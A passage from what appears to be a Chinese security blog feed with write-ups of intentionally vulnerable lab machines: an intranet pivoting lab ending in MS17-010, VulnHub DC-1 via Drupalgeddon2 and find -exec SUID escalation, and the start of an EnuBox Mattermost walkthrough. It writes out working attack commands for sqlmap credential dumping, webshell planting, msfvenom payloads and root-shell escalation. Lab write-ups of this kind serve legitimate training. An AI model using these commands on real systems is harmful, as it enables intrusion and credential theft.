class="line">Hint：SQL注入点：/index.php?r=vul&amp;keyword=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1122.png" alt="图片"></p><p>既然靶场作者都提示说是<code>SQL</code>注入，那么直接上<code>Sqlmap</code>一梭哈获取到了后台账号和密码hash：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password –dump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: bagecms</span><br><span class="line">Table: bage_admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+-------------------------------------------+</span><br><span class="line">| username | password                                  |</span><br><span class="line">+----------+-------------------------------------------+</span><br><span class="line">| admin    | 46f94c8de14fb36680850768ff1b7f2a (123qwe) |</span><br><span class="line">+----------+-------------------------------------------+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1123.png" alt="图片"></p><h2 id="BageCMS-后台Getshell"><a href="#BageCMS-后台Getshell" class="headerlink" title="BageCMS-后台Getshell"></a>BageCMS-后台Getshell</h2><p>拿到后台账号密码登录进去后得到了一个 <code>Flag</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eS3sd1IKarw&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1124.png" alt="图片"></p><p>接下来就要获取<code>webshell</code>了，我是在后台模板这里找到了可以编辑<code>PHP</code>文件的地方：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1125.png" alt="图片"></p><p>随后编辑 <code>index.php</code> 写入一句话到里面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1126.png" alt="图片"></p><p>然后再设置一下 <code>Proxifier</code> 的代理规则：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1127.png" alt="图片"></p><p>这样就可以使用蚁剑连接<code>webshell</code>了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1128.png" alt="图片"></p><p>紧接着我在 <code>upload</code> 目录找到了 <code>Flag</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23ASfqwr4t2e&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1130.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1131.png" alt="图片"></p><p>我们再使用 <code>MSF</code> 生成一个木马让它上线吧，这里我使用的是<code>正向</code>Payload（因为在内网中它无法访问到外网，所以就只能我们去连接它）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=5555 -f elf &gt; 5555.elf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1132.png" alt="图片"></p><p>然后打开我们的 <code>MSF</code> （这里需要使用代理打开，不然反弹不回来shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1133.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1134.png" alt="图片"></p><h2 id="杀入第三层内网Target3"><a href="#杀入第三层内网Target3" class="headerlink" title="杀入第三层内网Target3"></a>杀入第三层内网Target3</h2><p>反弹回来之后我查看<code>ifconfig</code>发现了两个可用的网卡：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1135.png" alt="图片"></p><p>然后获取当前网卡可用的网段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1136.png" alt="图片"></p><p>从上图可以看到，他有两个网段，第一个是 <code>192.168.22.0/24</code>，第二个是 <code>192.168.33.0/24</code>，我们重复之前的操作，添加一个路由表到后者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1137.jpg" alt="图片"></p><p>添加成功后我们使用之前那个扫描模块，设置好 <code>PORTS</code>、<code>RHOSTS</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1138.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1139.jpg" alt="图片"></p><p>扫描完后发现发开放了<code>445</code>和<code>3389</code>端口，因此判断有可能是 <code>Windows</code> 系统！</p><p>为了验证，我使用了这个模块去探测它的操作系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1140.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1141.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.33.33:445     - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-POVQ8FCTTO4)</span><br></pre></td></tr></table></figure><p>果然是 <code>Windwo</code>s 的系统，而且版本是<code>Windows 7 Ultimate SP1</code>！既然它是 <code>Windwos 7</code> 系统，而且开放了 <code>445</code> 端口，有没有可能会存在<code>MS17-010</code>（永恒之蓝）呢？</p><h2 id="Windwos7-MS17-010提权拿到Flag"><a href="#Windwos7-MS17-010提权拿到Flag" class="headerlink" title="Windwos7-MS17-010提权拿到Flag"></a>Windwos7-MS17-010提权拿到Flag</h2><p>紧接着我使用了<code>MSF</code>的模块对它进行探测看看是否存在永恒之蓝，我使用的辅助模块是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1142.jpg" alt="图片"></p><p>由上图可知，<code>MSF</code> 检测出 <code>192.168.33.33</code> 这台主机存在<code>MS17-010</code>（永恒之蓝）！那么我们就可以对它进行利用，接下来使用这个利用模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1143.jpg" alt="图片"></p><p>注意一下，我们选择 <code>MS17_010</code> 这个利用模块后，我们还需要设置一下 <code>Payload</code> ，因为它默认的是 <code>reverse_tcp</code>(反向)，而它主机不能出外网所以就只能使用<code>正向</code>（bind_tcp）我们去连接它！</p><p>设置好参数后运行 <code>exploit</code> 获取到一枚 <code>Meterpreter</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1144.jpg" alt="图片"></p><p>由上图可知，我们已经是系统权限了！最后就是找到<code>Flag</code>文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1145.jpg" alt="图片"></p><p>最终也是在 <code>Administrator</code> 用户的 <code>Desktop</code> 桌面找到了 <code>Flag.txt</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> RedTeaming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> RedTeaming </tag>
            
            <tag> 横向渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 永恒之蓝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_1-Walkthrough</title>
      <link href="/2020/02/18/Vulnhub-DC-1/"/>
      <url>/2020/02/18/Vulnhub-DC-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29794354&auto=1&height=66"></iframe><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>DC系列的靶机是一个专门构建的易受攻击的实验室，总共有九个！目的是获得渗透测试领域的经验。<br>它的设计初学者是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。<br>要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行以及具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。<br>有多种获得根的方法，但是，我包括了一些标志，这些标志包含了初学者的线索。<br>总共有五个Flag，但是最终目标是在root的主目录中找到并读取该标志。您甚至不需要成为root用户即可执行此操作，但是，您将需要root特权。<br>根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获得root资格。</p><h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>Drupal 7</code> CMS的<code>RCE</code>(Metasploit)</p><p><code>Drupal 7</code> 的 <code>Mysql</code> 写入 <code>SQL</code> 添加后台管理员账号</p><p><code>find</code> 命令 <code>SUID</code> 权限提升</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机后先对它端口进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.1.142</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1063.png" alt="图片"></p><p>扫描出来结果发现它开放了 <code>22</code>（ssh）、<code>80</code>（http）、<code>111</code>（nfs共享）。</p><p>其中 <code>http</code> 的 <code>web</code> 使用的 <code>CMS</code> 是 <code>Drupal 7</code>。我们先从 <code>web</code> 下手吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.142</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1064.png" alt="图片"></p><p>在 <code>web</code> 页面上没有啥东西，尝试了一下弱口令无果，还是先对它进行扫描目录文件吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.142</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1065.png" alt="图片"></p><p>扫描出来后发现有 <code>robots.txt</code> 文件，打开后是这样的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1066.png" alt="图片"></p><p>我在翻了一些文件没有得到可利用的信息，只是知道它的版本好像是 <code>7.x</code> 版本。随后我搜索了一下有关于这个 CMS 的漏洞，看看能不能捡个漏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1067.png" alt="图片"></p><p>从上图可知，它漏洞还是蛮多的，刚好有一个 <code>RCE</code> 可以用 <code>Metasploit</code> 来进行利用！随后我打开 MSF 搜索了一下它的利用模块，我使用的是这个模块（前面几个看了不能用）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1068.png" alt="图片"></p><p>之后设置 <code>rhosts</code> 开始攻击 <code>exploit</code> 得到一枚 <code>shell</code>：</p><p>看了看只是一个普通的网站权限，系统是 <code>Linux</code> 的 <code>Debian</code> 。</p><p>我先是用 <code>MSF</code> 的提权辅助模块来尝试看看能不能运气爆棚的鸡蛋里挑骨头找到一个提权模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1069.png" alt="图片"></p><p>额，没有找到可以用来提权的模块，那么就算了～我还是先进它 <code>shell</code> 里面看看吧，只有打入敌人内部才能取敌将首级！进入到 <code>shell</code> 后先用 <code>python</code> 来得到一枚 <code>sh</code> 吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1070.png" alt="图片"></p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>我所在的目录是网站的绝对路径 <code>/var/www</code>，下面有一个 <code>flag1.txt</code> 文件，<code>cat</code> 查看文件后拿到第一个 <code>flag</code>，里面有作者给我们的提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1071.png" alt="图片"></p><p>翻译过来大概就是让我们找 <code>CMS</code> 的配置文件，这也是我们获取下一个<code>flag</code>的线索之一！</p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>得到线索后，我疯狂翻网站的目录找到了它的配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1072.png" alt="图片"></p><p>查看文件后我们得到了<code>Flag2</code>，又得到了一个新线索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1073.png" alt="图片"></p><p>翻译过来大概的意思是告诉我们暴力用字典破解不是一个有效的方式，既然得到了配置文件，你能用这个配置文件来做什么？</p><h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>很明显了，这段提示下面就是一个数据库的配置信息，作者可能是要让我们进入到 <code>Mysql</code> 里面！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库名：&#x27;drupaldb&#x27;,</span><br><span class="line">用户名：&#x27;dbuser&#x27;,</span><br><span class="line">密码：&#x27;R0ck3t&#x27;,</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1074.png" alt="图片"></p><p>成功登陆到它的 Mysql 里面，我找到了一些账号和密码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1075.png" alt="图片"></p><p>但是这玩意密码有哈希加密了的，我又连续查询了好多表才发现了 <code>Flag3</code> 的一丝线索：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1076.png" alt="图片"></p><p>它这里的 <code>title</code> 里有 <code>flag3</code>，但是里面没有提示信息！既然是在 <code>title</code> 上有 <code>flag3</code> 的线索，那么有可能是在网站的里面，也就是网站的后台里！</p><p>接着我重新写入了一段 <code>SQL</code> 语句，把管理员的密码给重置了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">具体可以看这篇文章：https://www.isfirst.net/drupal/drupal-reset-password</span><br><span class="line"></span><br><span class="line">update users set pass=&#x27;$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v&#x27; where name=&#x27;admin&#x27;;</span><br><span class="line"># 这段 sql 语句的意思是把 admin 的密码重置为 drupal ，因为它的 pass 加密是 password-hash.sh ，所以我们直接给他替换掉！</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1077.png" alt="图片"></p><p>写入成功后，我们来到网站的登陆页面：<code>http://192.168.1.142/user</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin：drupal</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1078.png" alt="图片"></p><p>登陆进去后我们得到了 <code>Flag3！</code> 这个时候我们又得到了一个新线索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure><p>大概的意思是让我们通过 <code>-exec</code> 命令来得到密码啥的！</p><h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><p>既然提示说要我们通过命令来得到密码，那么我首先是查看了 <code>passwd</code> 文件，发现了有关 <code>flag4</code> 的线索：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1079.png" alt="图片"></p><p>有一个 <code>flag4</code> 的用户，随后我来到了 <code>flag4</code> 的目录发现了 <code>flag4.txt</code> 文件！（saul文件是我之前玩靶机留下的，大家当作没有就好了）</p><p>打开之后呢得到了最后一个线索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1080.png" alt="图片"></p><p>翻译过来的意思大概是让我们以相同的方式来得到 <code>root</code> 目录下的 <code>flag</code> 。</p><h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><p>得到线索后我习惯性的 <code>sudo -l</code> 查看有没有什么命令可以让我提权的，但是它没有 <code>sudo</code> 这个命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1081.png" alt="图片"></p><p>额，有点打脑壳！借用<code>朝阳冬泳怪鸽</code>的话：我们遇到什么困难也不要怕，微笑着面对它！消除恐惧的最好办法就是面对恐惧！坚持，才是胜利。加油！奥利给！</p><p>别慌，抽根烟再好好想想！我又接着查看下，看它有没有 <code>root</code> 权限的文件，但是没有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1082.png" alt="图片"></p><p>接着我又查看了有没有 <code>root</code> 权限的 <code>SUID</code> 命令发现了这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1083.png" alt="图片"></p><p>其中有一个命令我之前提权的时候用过，就是 <code>find</code> 命令！刚好之前在拿到 <code>Flag3</code> 的时候它提示了 <code>-exec</code> 命令！这是一个参数，搭配 <code>find</code> 查找命令使用可以调用命令来去执行！</p><p>我首先是想在 <code>flag4</code> 目录创建个文件，但是失败了！但是没关系！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1084.png" alt="图片"></p><p>由于当前目录下有一个 <code>flag4.txt</code> 文件我们就直接使用 <code>find</code> 查看当前权限，请忽略上面那条命令！（当时的思路是创建一个文件，然后使用 find 命令来查找这个文件然后执行命令的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find flag4.txt -exec &quot;whoami&quot; \;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1085.png" alt="图片"></p><p>可以看到，我们的权限是 <code>root</code> 了，我们直接提权把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find flag4.txt -exec &quot;/bin/sh&quot; \;</span><br><span class="line"># 这段命令的意思就是先使用 find 命令查找 flag4.txt 文件，然后使用它的参数 -exec 来执行命令 /bin/sh ，这样我们就能获取到 root 权限了！</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1086.png" alt="图片"></p><p>最后也是在 <code>root</code> 目录下拿到了最后的 <code>Flag</code> 文件！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-EnuBox_Mattermost，逆向分析文件获取Flag</title>
      <link href="/2020/02/15/Vulnhub-EnuBox-Mattermost/"/>
      <url>/2020/02/15/Vulnhub-EnuBox-Mattermost/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29418944&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>靶机地址：<a href="https://www.vulnhub.com/entry/enubox-mattermost,414/">https://www.vulnhub.com/entry/enubox-mattermost,414/</a><br>Name：EnuBox：Mattermost<br>靶机介绍：The Mattermost chatting system may or may not hold sensitive information. Can you find your way in?</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机 <code>IP</code> 之后上神器 <code>NMAP</code> 对它就是一顿梭哈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.1.137</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1034.png" alt="图片"></p><p>扫描完成后，发现它开放了 <code>21</code>（ftp）、<code>22</code>（ssh）、<code>80</code>（http）、<code>3389</code>（XRDP远程桌面）、<code>8065</code>（web） 端口。</p><p>其中 <code>ftp</code> 可以用匿名用户 <code>anonymous</code> 登陆：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1035.png" alt="图片"></p><p>由上图所示登陆到它的 <code>ftp</code> 后没有显示任何文件！那么我们还是先来看看 <code>web</code> （80、8065）的目录文件把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.137</span><br><span class="line">dirb http://192.168.1.137:8065</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1036.png" alt="图片"></p><p>枚举目录出来后先是看了 <code>80</code> 端口的 <code>index.html</code>，它显示的是 <code>403</code> 没有找到，但是页面上的信息提示有一个 <code>README.md</code> 的文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1037.png" alt="图片"></p><p>我访问 <code>README.md</code> 发现是 <code>404</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.137/README.md</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1038.png" alt="图片"></p><p>这个时候先放弃 <code>80</code> 端口，来到 <code>8065</code> 端口看看，它扫描出来是有一个 <code>robots.txt</code> 文件，访问但是空白的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.137:8065/robots.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1039.png" alt="图片"></p><p>这个时候我直接访问它的首页发现是一个登陆页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.137:8065/login </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1040.png" alt="图片"></p><h2 id="tftp下载README-md文件"><a href="#tftp下载README-md文件" class="headerlink" title="tftp下载README.md文件"></a>tftp下载README.md文件</h2><p>它使用的 <code>CMS</code> 是 <code>Mattermost</code> ，它是一款易于使用、经过简化且可扩展的团队通信和企业消息传送系统。</p><p>尝试若口令无果，<code>Google</code> 上只有它的默认 <code>Mysql</code> 的账号密码，我用来尝试登陆 <code>Web</code> 无果。</p><p>思路回到上面，刚刚打开 <code>80</code> 端口的 <code>Web</code> 页面它提示了一个 <code>README.md</code><br>文件，是不是作者告诉我们那个是关键点呢？刚好我们有了它的 <code>ftp</code> 匿名用户可以登陆，但是刚刚看过了没有任何文件，正当我一筹莫展的时候我下意识的在 <code>tftp</code> 里尝试能不能把 <code>README.md</code> 下载到本地，没想到真成了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 因为我写到这里的时候是第二天了，我重启后靶机的 IP 就变成 192.168.1.138 了！</span><br><span class="line">tftp 192.168.1.138</span><br><span class="line"># TFTP是一个传输文件的简单协议，它基于UDP协议而实现的。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1041.png" alt="图片"></p><p>把 <code>README.md</code> 下载到本地打开后发现我们得到了一个账号和密码：</p><figure class="highlight 